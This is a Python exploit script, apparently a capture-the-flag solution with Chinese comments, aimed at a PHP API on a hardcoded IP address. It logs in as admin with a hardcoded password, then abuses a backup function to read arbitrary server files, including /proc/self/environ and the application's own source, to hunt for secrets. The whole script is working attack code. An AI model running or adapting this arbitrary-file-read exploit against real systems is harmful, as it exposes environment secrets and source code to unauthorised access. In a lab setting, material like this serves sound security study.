import requests
import json
import base64
import zlib

url = "http://39.105.197.135:24618/api.php"
session = requests.Session()


def read_file(path):
    # 封装基于 backup 漏洞的文件读取逻辑
    args = {
        "option": "manage",
        "action": "system",
        "sub_args": {"action": "backup", "backfile": path},
    }
    payload = base64.b64encode(json.dumps(args).encode()).decode()
    res = session.post(url, data={"args": payload}).json()
    if res.get("status") == "success" and res.get("data"):
        try:
            return zlib.decompress(base64.b64decode(res["data"]))
        except:
            return b"Decompress failed"
    return None


def pwn():
    # 登录并确保具备 sadmin 权限 [cite: 53, 54, 85]
    session.post(
        url,
        data={
            "args": base64.b64encode(
                json.dumps(
                    {
                        "option": "manage",
                        "action": "login",
                        "sub_args": {
                            "username": "admin",
                            "password": "0k4ckART@%F!,('DK>",
                        },
                    }
                ).encode()
            ).decode()
        },
    )

    # 1. 尝试从环境变量寻找 flag
    print("[*] Reading /proc/self/environ...")
    env = read_file("/proc/self/environ")
    if env:
        print(f"[+] Environ content: {env.replace(b'\\x00', b'\\n')}")

    # 2. 尝试读取 php 源代码寻找线索 (如 index.php)
    print("\n[*] Reading /var/www/html/api.php to check for hidden keys...")
    api_src = read_file("/var/www/html/api.php")
    # 这里可以检查代码中是否有未披露的硬编码逻辑


if __name__ == "__main__":
    pwn()
